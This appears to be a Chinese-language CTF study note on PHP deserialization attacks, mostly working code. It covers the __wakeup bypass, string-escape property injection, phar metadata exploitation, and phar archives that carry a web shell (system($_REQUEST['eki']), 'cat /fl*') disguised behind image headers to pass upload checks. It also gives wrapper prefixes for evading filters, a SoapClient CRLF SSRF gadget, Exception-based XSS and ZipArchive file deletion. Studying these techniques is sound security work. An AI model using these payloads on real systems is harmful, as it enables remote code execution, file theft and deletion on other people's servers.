## PHP序列化问题

### 反序列化魔术方法

```php
__construct()//当一个对象创建时被调用
__destruct() //当一个对象销毁时被调用
__toString() //当一个对象被当作一个字符串使用
__sleep()//在对象在被序列化之前运行
__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)
__get()//获得一个类的成员变量时调用
__set()//设置一个类的成员变量时调用
__invoke()//调用函数的方式调用一个对象时的回应方法
__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数
```

### public、protected与private在序列化时的区别

>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0*\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0*\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。

解决方法 php输出的时候``urlencode()``或者用python burp等修改hex

```php
<?php
class Name{
    protected $username = 'nonono';
    protected $password = 'yesyes';
    public function __construct($username,$password){
    	$this->username = $username;
        $this->password = $password;
    }
    public function __wakeup(){
    	$this->username = "guests";
    }
    public function fun(){
    	echo $this->username;echo "<br>";echo $this->password;
    }
}
$a = serialize(new Name("admin",100));
echo $a;
?>
```

```
O:4:"Name":2:{s:11:"\0*\0username";s:5:"admin";s:11:"\0*\0password";i:100;}
```

private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。

可以不看：
这里 表示的是声明该私有字段的类的类名，而不是被序列化的对象的类名。因为声明该私有字段的类不一定是被序列化的对象的类，而有可能是它的祖先类。字段名被作为字符串序列化时，字符串值中包括根据其可见性所加的前缀。

```php
<?php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';
    public function __construct($username,$password){
    	$this->username = $username;
        $this->password = $password;
    }
    public function __wakeup(){
    	$this->username = "guests";
    }
    public function fun(){
    	echo $this->username;echo "<br>";echo $this->password;
    }
}
$a = serialize(new Name("admin",100));
echo $a;
?>
O:4:"Name":2:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
```

### ``__wakeup()``方法绕过

作用：
与``__sleep()``函数相反，``__sleep()``函数，是在序序列化时被自动调用。``__wakeup()``函数，在反序列化时，被自动调用。
绕过：
当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过``__wakeup`` 函数的执行。
上面的代码，序列化后的结果为

要求：PHP5 < 5.6.25 PHP7 < 7.0.10

```
O:4:"Name":2:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
```

其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()函数。

```
O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
```

### 利用字符逃逸进行非预期反序列

#### 字符数增加

构造属性向后溢出

#### 字符数减少

类前一个属性吃掉后一个属性的头部结构，使得后续类中的属性完全可控

#### Example

```php
function add($data)
{
    $data = str_replace(chr(0).'*'.chr(0), '\0*\0', $data);
    return $data;
}

function reduce($data)
{
    $data = str_replace('\0*\0', chr(0).'*'.chr(0), $data);
    return $data;
}

/* \0*\0 -> reduce(add()) -> * 5 -> 3

username=A\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=AB";s:11:"\0*\0password";O:8:"Hacker_A":1:{S:5:"c2\6538";O:8:"Hacker_B":1:{S:5:"c2\6538";O:8:"Hacker_C":1:{s:4:"name";s:4:"test";}}}s:8:"\0*\0admin";i:1;}&submit=Login
*/
```

## Phar 反序列化攻击

### 利用metadata的反序列化

利用函数(涉及到文件操作)

```
fileatime / filectime / filemtimestat / fileinode / fileowner / filegroup / filepermsfile / file_get_contents / readfile / fopen /file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable /parse_ini_file /unlink  /copy
exif_thumbnail / exif_imagetype / imageloadfont / imagecreatefrom*** / hash_hmac_file / hash_file / hash_update_file / md5_file /sha1_file
get_meta_tags /get_headers /getimagesize / getimagesizefromstring /zip
```

### 利用LFI导入恶意代码


```php
include("phar://exp.phar/eki.css")
```

```php
<?php
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('eki.css', '<?php system($_REQUEST[\'eki\']); system("ls /"); system("cat /fl*");?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

## 绕过

### 绕过字符串头部过滤

```
demo.php?filename=compress.bzip2://phar://upload_file/shell.gif/a
demo.php?filename=compress.zlib://phar://upload_file/shell.gif/a
```

### 绕过文件类型监测(文件头)

```php
<?php

$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');

$jpeg_header_size =
    "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xff\xfe\x00\x13".
    "\x43\x72\x65\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x47\x49\x4d\x50\xff\xdb\x00\x43\x00\x03\x02".
    "\x02\x03\x02\x02\x03\x03\x03\x03\x04\x03\x03\x04\x05\x08\x05\x05\x04\x04\x05\x0a\x07\x07\x06\x08\x0c\x0a\x0c\x0c\x0b\x0a\x0b\x0b\x0d\x0e\x12\x10\x0d\x0e\x11\x0e\x0b\x0b\x10\x16\x10\x11\x13\x14\x15\x15".
    "\x15\x0c\x0f\x17\x18\x16\x14\x18\x12\x14\x15\x14\xff\xdb\x00\x43\x01\x03\x04\x04\x05\x04\x05\x09\x05\x05\x09\x14\x0d\x0b\x0d\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14".
    "\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\x14\xff\xc2\x00\x11\x08\x00\x0a\x00\x0a\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01".
    "\xff\xc4\x00\x15\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03".
    "\x01\x00\x02\x10\x03\x10\x00\x00\x01\x95\x00\x07\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x05\x02\x1f\xff\xc4\x00\x14\x11".
    "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20".
    "\xff\xda\x00\x08\x01\x02\x01\x01\x3f\x01\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x06\x3f\x02\x1f\xff\xc4\x00\x14\x10\x01".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x21\x1f\xff\xda\x00\x0c\x03\x01\x00\x02\x00\x03\x00\x00\x00\x10\x92\x4f\xff\xc4\x00\x14\x11\x01\x00".
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x03\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda".
    "\x00\x08\x01\x02\x01\x01\x3f\x10\x1f\xff\xc4\x00\x14\x10\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xff\xda\x00\x08\x01\x01\x00\x01\x3f\x10\x1f\xff\xd9";


$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('exp.css', '<?php system($_REQUEST[\'eki\']); system("ls /"); system("cat /fl*");?>');
$phar->setStub($png_header . '<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

## 原生类反序列化

- SOAP

+CRLF SSRF

```php
<?php
$target = "http://127.0.0.1:5555";
$post_string = '';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=hgjf7894tb5m33n4c3ht1gu0n0'
    );
//这里还运用了CRLF注入攻击使得整个POST报文参数可控
$attack = new SoapClient(null,array('location' => $target,
                                    'user_agent'=>"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                                    'uri'      => "aaab"));
$payload = urlencode(serialize($attack));
echo $payload;
$c = unserialize(urldecode($payload));
$c->b();
```

- Exception

```php
<?php
error_reporting(0);
#$id= "$admin";
#show_source(__FILE__);
#if(unserialize($id) === "$admin")
$a = new Exception("<script>alert('xss');/script>");
$b = serialize($a);
$id = $b;
print unserialize($id);
```


- ZipArchive

利用``open``函数实现任意文件删除

```php
<?php
//ZipArchive::OVERWRITE ZipArchive::CREATE 
$zip = new ZipArchive;
$res = $zip->open('test.zip', ZipArchive::CREATE);
if ($res === TRUE) {
    $zip->addFromString('test.txt', 'file content goes here');
    $zip->addFile('data.txt', 'entryname.txt');
    $zip->close();
    echo 'ok';
} else {
    echo 'failed';
}
//$res = $zip->open('test.zip', ZipArchive::OVERWRITE);
?>
```
